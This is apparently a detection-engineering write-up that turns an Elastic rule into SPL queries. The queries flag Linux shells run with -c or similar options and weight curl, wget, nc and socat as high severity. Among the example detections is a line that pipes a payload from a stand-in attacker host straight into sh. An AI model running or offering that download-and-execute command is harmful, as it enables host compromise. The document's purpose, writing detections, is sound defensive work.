
### Sigma Rule Link (ELK Rule) :
**[command_and_control_elastic_endpoint_shell_execution](https://github.com/elastic/detection-rules/blob/ee4d117f0a54b4a9a538690fe5f5e4abb6d09921/rules/linux/command_and_control_elastic_endpoint_shell_execution.toml#L140)**




#### **First Format of Query which need Tuning :**  
  
```
index=auditd type=EXECVE  
| `non_prod_host`  
| eval shell=coalesce(comm,a0)  
| where match(shell,"(^|/)(bash|dash|sh|tcsh|csh|zsh|ksh|fish)$")  
| where a1 IN ("-c","-cl","-lc","--command")  
| eval severity=if(  
    match(lower(a2),"(curl|wget|nc|ncat|socat)"),  
    "high",  
    "low"  
)  
| eval execution_user=if(  
    uid="0" OR euid="0",  
    "root",  
    "non-root"  
)  
| stats  
    count AS execution_count  
    values(execve_command) AS Full_Command  
    values(shell) AS shell  
    values(a1) AS option  
    values(a2) AS command  
    values(execution_user) AS execution_user  
    values(severity) AS severity  
    values(audit_id) AS audit_id  
    values(AUID) AS AUID  
    BY host
```


#### **The complete format of rule :**
```
index=auditd type=EXECVE   
| rename host as dest
| `non_prod_host`
| eval shell=coalesce(comm,a0)  
| where match(shell,"(^|/)(bash|dash|tcsh|csh|zsh|ksh|fish)$")  
| eval important=if(a1 IN ("-c","-cl","-lc","--command"), "Critical" , "Medum")
| eval severity=if(  
match(lower(a2),"(curl|wget|nc|ncat|socat)"),  
"high",  
"low"  
)  
| eval execution_user=if(  
uid="0" OR euid="0",  
"root",  
"non-root"  
)  
| stats  
count AS execution_count  
values(execve_command) AS Full_Command  
values(shell) AS shell  
values(a1) AS option  
values(a2) AS command  
values(execution_user) AS execution_user  
values(audit_id) AS audit_id  
values(AUID) AS AUID  
values(severity) AS severity  
values(important) AS Important
BY dest
```



### **The Best version of Rule** 
```
index=auditd type=PROCTITLE  
| rename host AS dest proctitle AS Command  
| `Linux_shell_executed_with_command_option`  
| `non_prod_host`  
| eval Command=lower(Command)  
| where match(  
    Command,  
    "(^|[\\s\"'])(/[^ \\t\"']*/)?(bash|sh|dash|tcsh|csh|zsh|ksh|fish)([\\s\"']+)((-c|-cl|-lc|--command)|(.*(^|[\\s\"'/])(curl|wget|nc|ncat|socat)([\\s\"']|$)))"  
)  
| stats  
    min(_time) AS firstTime  
    max(_time) AS lastTime  
    count AS execution_count  
    values(Command) AS Command  
    values(audit_id) AS audit_id  
    count by dest  
| `security_content_ctime(firstTime)`  
| `security_content_ctime(lastTime)`**
```



## Logic of rule :
The detection logic is very simple:

1. **Look for a shell being started**, such as:
    
    - `bash`
        
    - `sh`
        
    - `zsh`
        
    - `ksh`
        
    - `fish`
        
2. **Check if it was started with a command execution option**, such as:
    
    - `-c`
        
    - `-lc`
        
    - `-cl`
        
    - `--command`
        
3. **Why this is suspicious**  
    These options tell the shell to execute a command immediately instead of opening an interactive shell. Attackers commonly use this technique to run one-line payloads, download malware, or execute scripts.
    

### Examples

**Normal interactive shell (not detected):**

```bash
bash
```

**Detected:**

```bash
bash -c "id"
```

```bash
sh -c "curl http://evil.com/payload.sh | sh"
```

```bash
zsh -lc "whoami"
```

### In the original Elastic rule

The rule also checks that the **parent process is `elastic-endpoint`**, meaning the shell was launched through the **Elastic Endpoint Response Console**. This helps detect someone using Elastic's remote response feature to execute commands on a Linux host.

So the complete logic is:

> **Detect a Linux shell that is executing a command (`-c`, `-lc`, etc.), especially when it was launched by the Elastic Endpoint response console.**